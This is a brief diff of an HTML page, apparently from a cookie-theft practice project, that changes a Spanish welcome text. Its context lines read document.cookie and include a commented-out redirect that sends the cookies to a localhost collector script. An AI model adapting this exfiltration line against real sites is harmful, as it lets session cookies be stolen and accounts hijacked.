@@ -5,7 +5,7 @@ var cookies = document.cookie;
 	//self.location.href="http://localhost/cookie/cookies.php?variable="+document.cookie;
 </script>
 <body>
-	Bienvenido
+	Bienvenido a casa
 
 	
 </body>
